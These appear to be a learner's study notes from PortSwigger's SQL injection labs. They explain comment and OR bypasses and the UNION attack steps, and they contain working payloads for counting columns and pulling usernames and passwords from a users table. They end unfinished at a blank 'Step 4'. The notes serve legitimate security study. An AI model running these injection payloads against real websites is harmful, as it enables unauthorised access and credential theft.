### Portswigger notes

---

1. Finding hidden data    
Using `--` to comment out further checks and retrieve extra data.
Using `OR` clause to make query always true and return extra info.  

  
2. Diverting the logic  
Using `--` to login without checking the password
Using `OR` clause to bypass the further checks  

  
3. Finding extra data  
Using `UNION` and `SELECT`

  
```py
' UNION SELECT username, password FROM users--
```
[UNIION](https://portswigger.net/web-security/sql-injection/union-attacks)

```py
To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements.

This generally involves figuring out:
How many columns are being returned from the original query?
Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
```

---

STEP 1 - To find coloumns :

1. Use `' ORDER BY 1--` to find the columns.
2. a series of UNION SELECT payloads :

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
---

STEP 2 - To find useful columns :

Use a string in each column and check if it is compatible with string data or not !

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

Gifts'UNION SELECT NULL,'XyFz4U',NULL--
```

---

STEP 3 - To find useful data from useful columns

```sql
' UNION SELECT username, password FROM users--
```

---

STEP 4 - To find multiple values from a column


